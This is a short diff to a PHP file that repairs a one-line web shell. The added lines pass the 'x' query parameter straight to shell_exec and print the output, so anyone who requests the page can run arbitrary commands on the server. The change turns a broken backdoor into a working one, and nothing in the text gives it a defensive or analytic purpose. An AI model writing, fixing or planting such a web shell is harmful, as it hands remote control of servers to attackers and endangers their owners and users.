@@ -1,6 +1,6 @@
 
 <?php
-var up = shell_exec($_GET['x']);
+$up = shell_exec($_GET['x']);
 
-echo "<pre>up</pre>"
+echo "<pre>$up</pre>"
 ?>
